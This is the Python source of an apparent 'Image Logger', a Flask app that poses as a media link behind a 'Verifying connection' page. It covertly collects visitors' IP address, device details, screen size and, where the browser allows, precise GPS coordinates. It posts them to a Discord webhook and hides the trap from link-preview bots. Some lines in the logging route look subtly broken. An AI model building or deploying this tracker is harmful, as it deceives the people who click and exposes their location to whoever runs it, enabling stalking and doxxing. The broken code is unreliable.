from flask import Flask, request, redirect
import requests
import json
import os
from datetime import datetime
from user_agents import parse

app = Flask(__name__)

# CONFIGURATION (Loaded from Environment Variables in Vercel)
WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
CUSTOM_IMAGE_URL = os.environ.get("CUSTOM_IMAGE_URL", "") 

# List of random fallback images
IMAGES = [
    "https://images.unsplash.com/photo-1506744038136-46273834b3fb",
    "https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05",
    "https://images.unsplash.com/photo-1441974231531-c6227db76b6e",
    "https://images.unsplash.com/photo-1501785888041-af3ef285b470",
    "https://images.unsplash.com/photo-1493246507139-91e8bef99c02"
]

def get_ip_info(ip):
    try:
        fields = "status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,proxy,mobile,currency"
        response = requests.get(f"http://ip-api.com/json/{ip}?fields={fields}")
        return response.json()
    except Exception:
        return {}

def send_to_discord(ip, ua_string, geo, gps_data=None):
    try:
        ua = parse(ua_string)
        os_detail = f"{ua.os.family} {ua.os.version_string}"
        browser_detail = f"{ua.browser.family} {ua.browser.version_string}"
        full_device = f"{ua.os.family} | {ua.browser.family} | {ua.device.family}"

        # Coords handling (GPS vs IP)
        coords = f"{geo.get('lat', '??')}, {geo.get('lon', '??')} (Approximate)"
        location_source = "🌐 IP Hub"
        if gps_data:
            coords = f"{gps_data.get('lat')}, {gps_data.get('lon')} (📍 Pinpoint GPS)"
            location_source = "📍 GPS Accurate"

        embed = {
            "title": "Image Logger - IP Logged",
            "description": f"Target has opened the link! Source: **{location_source}**",
            "color": 3447003,
            "thumbnail": {"url": "https://i.imgur.com/w9fXfM9.png"},
            "fields": [
                {"name": "Endpoint", "value": "`/api/image`", "inline": False},
                {"name": "IP Info:", "value": f"```\nIP: {ip}\nProvider: {geo.get('isp', 'Unknown')}\nASN: {geo.get('as', 'Unknown')}\nCountry: {geo.get('country', 'Unknown')}\nRegion: {geo.get('regionName', 'Unknown')}\nCity: {geo.get('city', 'Unknown')}\nCoords: {coords}\nTimezone: {geo.get('timezone', 'Unknown')}\nMobile: {'True' if geo.get('mobile') else 'False'}\nVPN: {'True' if geo.get('proxy') else 'False'}\nBot: False\n```", "inline": False},
                {"name": "PC Info:", "value": f"```\nOS: {os_detail}\nBrowser: {browser_detail}\nDetails: {full_device}\nResolution: {gps_data.get('res', 'Unknown') if gps_data else 'Unknown'}\n```", "inline": False}
            ],
            "timestamp": datetime.now().isoformat()
        }
        requests.post(WEBHOOK_URL, json={"username": "Image Logger", "embeds": [embed]}, timeout=10)
    except:
        pass

@app.route('/')
def index():
    user_agent = request.headers.get('User-Agent', 'Unknown')
    ip = request.headers.get('x-forwarded-for', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()

    # Discord Bot Prevention
    if any(bot in user_agent for bot in ["Discordbot", "TelegramBot", "Twitterbot", "Slackbot"]):
        return "<html><head><title>Loading Tenor...</title></head><body>Redirecting to media...</body></html>"

    import random
    redirect_url = CUSTOM_IMAGE_URL if CUSTOM_IMAGE_URL else random.choice(IMAGES)

    # Serve JS Bridge
    return f"""
    <html>
    <head>
        <title>Verifying Connection...</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {{ background-color: #2f3136; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', sans-serif; margin: 0; }}
            .loader {{ border: 4px solid #444; border-top: 4px solid #5865f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
            .container {{ text-align: center; padding: 20px; }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="loader" style="margin: 0 auto 20px;"></div>
            <h2>Verifying connection...</h2>
            <p>Please wait while we secure your media stream.</p>
        </div>

        <script>
            const webhook_data = {{
                ip: "{ip}",
                ua: navigator.userAgent,
                res: window.screen.width + 'x' + window.screen.height
            }};

            function finalize(gps = null) {{
                fetch('/log', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{ ...webhook_data, gps: gps }})
                }}).finally(() => {{
                    window.location.href = "{redirect_url}";
                }});
            }}

            // Request GPS (Pinpoint Accuracy)
            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(
                    (pos) => {{
                        finalize({{ lat: pos.coords.latitude, lon: pos.coords.longitude }});
                    }},
                    (err) => {{
                        finalize(); // Denied or Error -> Fallback to IP
                    }},
                    {{ enableHighAccuracy: true, timeout: 5000 }}
                );
            }} else {{
                finalize();
            }}
            
            // Safety timeout redirect
            setTimeout(() => {{ window.location.href = "{redirect_url}"; }}, 10000);
        </script>
    </body>
    </html>
    """

@app.route('/log', methods=['POST'])
def log_endpoint():
    try:
        data = request.json
        ip = data.get('ip')
        ua = data.get('ua')
        gps = data.get('gps') # lat, lon or None
        
        geo = get_ip_info(ip)
        send_to_discord(ip, ua, geo, gps_data={{ 'lat': gps['lat'], 'lon': gps['lon'], 'res': data.get('res') }} if gps else {{ 'res': data.get('res') }})
        
        return {{"status": "ok"}}
    except:
        return {{"status": "error"}}, 500

if __name__ == '__main__':
    app.run(debug=True)
